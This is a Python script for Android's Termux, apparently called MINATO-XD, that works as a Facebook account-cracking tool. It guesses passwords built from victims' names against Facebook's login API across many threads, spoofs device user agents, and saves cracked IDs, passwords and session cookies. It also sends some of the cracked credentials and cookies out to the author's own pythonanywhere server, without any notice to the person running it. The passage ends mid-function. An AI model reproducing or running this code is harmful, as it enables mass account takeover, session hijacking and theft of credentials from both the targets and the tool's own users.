#!/data/data/com.termux/files/usr/bin/python3.12
# -*- coding: utf-8 -*-
#REVISED BY MINATO-XD
#----------------\<-IMPORT-MODULE->/----------------#
import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib
from os import system
from io import BytesIO
from time import localtime as lt
from pip._vendor import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#----------------\<-COLOR->/----------------#
G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"

#----------------\<-STYLE->/----------------#
xp = f"{G}《{W} ✮ {G}》{W}"
xp1 = f"{G}《{W} 1 {G}》{W}"
xp2 = f"{G}《{W} 2 {G}》{W}"
xp3 = f"{G}《{W} 3 {G}》{W}"
xp4 = f"{G}《{W} 4 {G}》{W}"
xp5 = f"{G}《{W} 5 {G}》{W}"
xp0 = f"{G}《{W} 0 {G}》{W}"
xpx = f"{G}《{W} ? {G}》{W}"
xpxx = f"{G}•{W}•{G}•{W}⊰{G}⊹{W}"

#----------------\<-INTERNET->/----------------#
try:
    requests.get("https://www.google.com", timeout=5)
except requests.exceptions.ConnectionError:
    system("clear" if os.name == "posix" else "cls")
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{G}━"*56)
    sys.exit()

#----------------\<-NO-MODULE->/----------------#
try:
    import pycurl
except ImportError as e:
    system("clear" if os.name == "posix" else "cls")
    missing_module = str(e).split("'")[1]
    if missing_module == "pycurl":
        print(f"{xp} YOU DON'T HAVE PYCURL MODULE PLZ INSTALL IT")
        print(f"{xp} RUN {xpxx} pip install pycurl")
        print(f"{G}━"*56)
        sys.exit()

#----------------\<-SYS->/----------------#
sys.stdout.write('\x1b[1;37m\x1b]2; 《 MINATO✮NAMIKAGE 》\x07')

#----------------\<-FILE-PATH->/----------------#
sd_folder = "/sdcard/MINATO-XD"
MINATO_folders = ("RANDOM", "FILE")
os.makedirs(sd_folder, exist_ok=True)
for folder in MINATO_folders:
    os.makedirs(os.path.join(sd_folder, folder), exist_ok=True)

#----------------\<-DATE->/----------------#
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{G}/{W}{__months__}{G}/{W}{__years__}'

ltx = int(lt()[3])
a = ltx - 12 if ltx > 12 else ltx
tag = "PM" if ltx > 12 else "AM"

#----------------\<-COUNTRY->/----------------#
ip = requests.get("https://api.ipify.org").text
ip_info = requests.post(f"http://ip-api.com/json/{ip}")
af = json.loads(ip_info.text)

#----------------\<-SDCARD PERMISSION->/----------------#
try:
    system("clear" if os.name == "posix" else "cls")
    system("rm -rf /sdcard/.txt > /dev/null 2>&1")
    with open("/sdcard/.txt", "w") as f:
        f.write(" ")
except PermissionError:
    print(f"{xp} WITHOUT STORAGE PERMISSION YOU CANNOT ")
    print(f"{xp} RUN THIS TOOL ALLOW STORAGE PERMISSION ")
    print(f"{G}━"*56)
    system("termux-setup-storage -y > /dev/null 2>&1")
    sys.exit(f"{xp} RUN AGAIN THIS TOOL ")

#----------------\<-CLEAR->/----------------#
def __CLEAR__():
    system("clear" if os.name == "posix" else "cls")
    print(logo)

#----------------\<-LINE->/----------------#
def __LINE__():
    print(f"{G}━"*56)
#----------------\<-UA-NORMAL-MIX->/----------------#
def _____UpDaTe_S1_____():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___Minato_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___Minato_on_Fire___

def _____UpDaTe_S2_____():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ___Minato_on_Fire___ = ''+str(iphone3)+' '+str(agent3)
    return ___Minato_on_Fire___
#----------------\<-VERSION->/----------------#
versn = requests.get(f"https://raw.githubusercontent.com/Minato-404/Control-room/main/VERSION").text.strip();version = str(versn)
#----------------\<-SHORT->/----------------#
__COUNTRYS__ = af['country'].upper()
xlinex = (f"{G}━"*56)
#----------------\<-LOGO->/----------------#
logo = f"""
             {G} ╔╦╗╦╔╗╔╔═╗╔╦╗╔═╗   ═╗ ╦╔╦╗
             {G} ║║║║║║║╠═╣ ║ ║ ║───╔╩╦╝ ║║
             {G} ╩ ╩╩╝╚╝╩ ╩ ╩ ╚═╝   ╩ ╚══╩╝
{W}      👑 EDITING POWER BETTER THAN PROGRAMMER 👑
{xlinex}
{xp} TYPE     {xpxx} FILE{G}〤{W}RANDOM{G}〤{W}CLONE
{xp} COUNTRY  {xpxx} {__COUNTRYS__}
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""

#----------------\<-SELF->/----------------#
class __MINATOXMinato__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.minato = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []

    #----------------\<-MAIN-MENU->/----------------#
    def __MENU__(self) -> None:
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp2} RANDOM CLONING ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __LINE__()
            print(f"{xp} RANDOM CLONE COMING SOON...! ")
            time.sleep(1.1)
            self.__MENU__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    #----------------\<-FILE-MENU->/----------------#
    def __FILEX__(self) -> None:
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}MINATO.txt {G}/{W}OR{G}/{W} MINATO.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except PermissionError:
            __LINE__()
            print(f"{xp} ALLOW STORAGE PERMISSION ")
            time.sleep(1.2)
            __LINE__()
            sys.exit()
        except IOError:
            __LINE__()
            print(f"{xp} FILE READING ERROR TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()
        print(f"{xp1} METHOD {G}<[{W}GRAPH{G}]>{W}")
        print(f"{xp2} METHOD {G}<[{W}B-GRAPH{G}]>{W}")
        print(f"{xp3} METHOD {G}<[{W}API{G}]>{W}")
        print(f"{xp4} METHOD {G}<[{W}B-API{G}]>{W}")
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            __CLEAR__()
            print(f"{xp1} AUTO BANGLADESH PASSLIST ")
            print(f"{xp2} AUTO PAKISTAN PASSLIST ")
            print(f"{xp3} AUTO INDIA PASSLIST ")
            print(f"{xp4} AUTO NEPAL PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

            if __COUNTRYPAS__ == "1":
                self.plist.extend(["first1122", "first12", "first123", "first123", "first1234","first12345",  "first123456", "first last", "firstlast", "firstlast12", "firstlast123", "firstlast@123", "first111", "first@@@", "first@12", "first@123", "@first@", "first112233", "First1122", "first@#", "First12", "First123","First@123","First Last","Firstlast", ])
            elif __COUNTRYPAS__ == "2":
                self.plist.extend(["first123", "first@1234", "first@12345", "first786", "first110", "firstlast", "firstlast", "firstlast12", "firstlast123", "firstlast12345", "first@123", "last123", "last12345"])
            elif __COUNTRYPAS__ == "3":
                self.plist.extend(["firstlast", "first last", "first123", "57273200", "59039200", "234567", "708090", "firstlast", "firstlast123", "firstlast1234", "first123", "first2025", "first@", "first@@", "57273200"])
            elif __COUNTRYPAS__ == "4":
                self.plist.extend(["first123", "first12345", "first@123", "first@1234", "first last", "firstlast123", "firstlast@123", "first last123", "first123456789", "first123@", "first123@@", "first12345@"])
            else:
                self.plist.extend(["firstlast", "first12", "x@1234@", "@123456@", "first2025", "@@@###", "@@@@####", "first098", "first112233", "000999", "first321", "first10", "first@1212", "first4321", "first25", "22558800", "77889900", "first@#", "99887766", "09876543"])

        else:
            try:
                __CLEAR__()
                print(f"{xp} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
                print(f"{xp} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} PASSLIST LIMIT {xpxx} "))
            except:
                __PASSFM__ = 5

            __CLEAR__()
            print(f"{xp} EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED {G}<[{W}30{G}]> ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 30
        else:
            try:
                __CLEAR__()
                print(f"{xp} MAXIMUM SPEED LIMIT 30-60 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
            except ValueError:
                __MAXX__ = 60

        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW CP{G}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')

        with ThreadPool(max_workers=__MAXX__) as __MINATO__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL{G}/{W}UID {xpxx} {total_ids} ")
            print(f"{xp} USE AIRPLANE MODE ON{G}/{W}OFF IF NO RESULT")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __MINATO__.submit(self.__M1X__, ids, names, passlist)
                elif __METHODF__ == "2":
                    __MINATO__.submit(self.__M2X__, ids, names, passlist)
                elif __METHODF__ == "3":
                    __MINATO__.submit(self.__M3X__, ids, names, passlist)
                elif __METHODF__ == "4":
                    __MINATO__.submit(self.__M4X__, ids, names, passlist)
                elif __METHODF__ == "5":
                    __MINATO__.submit(self.__M5X__, ids, names, passlist)
                else:
                    __MINATO__.submit(self.__M1X__, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} {len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()

    #----------------\<-FILE-M1-GRAPH->/----------------#
    def __M1X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{G}<[{W}MINATO{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>'
                f'{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
            )
            sys.stdout.flush()

            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                ua = _____UpDaTe_S1_____()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": accessToken,
                    "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(11111, 99999)),
                    "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "Content-Length": "699"
                }
                url = "https://graph.facebook.com/auth/login"
                twf = "Login approval's are on. Expect an SMS shortly with a code to use for log in"
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-MiNaTo_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{G}<[{B}MINATO-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M1 : {ids}|{pas}|{cookie}"
                        requests.get(f"https://Minato404.pythonanywhere.com/api?id={idspas}")
                    break

                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}MINATO-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break

                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    if 'y' in self.__CP__:
